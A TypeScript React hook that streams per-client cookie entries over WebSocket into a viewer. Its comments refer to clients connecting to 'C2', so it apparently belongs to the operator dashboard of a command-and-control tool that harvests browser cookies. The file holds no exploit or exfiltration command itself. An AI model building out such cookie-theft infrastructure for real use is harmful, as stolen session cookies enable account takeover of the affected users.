import { useState, useCallback, useMemo } from "react";
import { useWebSocket } from "@/hooks/use-websocket";
import { buildViewerWsUrl } from "@/lib/utils";

export interface CookieEntry {
  id?: number;
  name: string;
  value: string | null;
  removed: boolean;
  timestamp: number;
}

interface CookiesMessage {
  type: "init" | "cookies" | "cleared" | "disconnected";
  cookies?: CookieEntry[];
}

interface UseCookiesResult {
  cookies: CookieEntry[];
  status: "connecting" | "open" | "closed";
  /** False when the client has disconnected from C2 (reset to true on next data message). */
  clientConnected: boolean;
  /** Send a clear command to the server and optimistically reset local state. */
  clearCookies: () => void;
}

/**
 * React hook that manages cookie entries from a WebSocket viewer connection.
 *
 * Handles:
 *   - `init`         — replace all entries with persisted state from the server
 *   - `cookies`      — append new incremental cookie changes
 *   - `cleared`      — reset to empty (server cleared the DB)
 *   - `disconnected` — no-op (status reflects the WS close separately)
 *
 * @param clientId - The client whose cookie entries to subscribe to.
 */
export function useCookies(clientId: string): UseCookiesResult {
  const [cookies, setCookies] = useState<CookieEntry[]>([]);
  const [clientConnected, setClientConnected] = useState(true);

  const wsUrl = useMemo(() => buildViewerWsUrl(clientId, "cookies"), [clientId]);

  const onMessage = useCallback((event: MessageEvent) => {
    let msg: CookiesMessage;
    try {
      msg = JSON.parse(event.data as string);
    } catch {
      return;
    }

    if (msg.type === "init") {
      setCookies(msg.cookies ?? []);
    } else if (msg.type === "cookies") {
      setCookies((prev) => [...prev, ...(msg.cookies ?? [])]);
    } else if (msg.type === "cleared") {
      setCookies([]);
    } else if (msg.type === "disconnected") {
      setClientConnected(false);
    }
  }, []);

  const { status, send } = useWebSocket(wsUrl, { onMessage });

  const clearCookies = useCallback(() => {
    send(JSON.stringify({ type: "clear" }));
    setCookies([]); // Optimistic reset
  }, [send]);

  return { cookies, status, clientConnected, clearCookies };
}
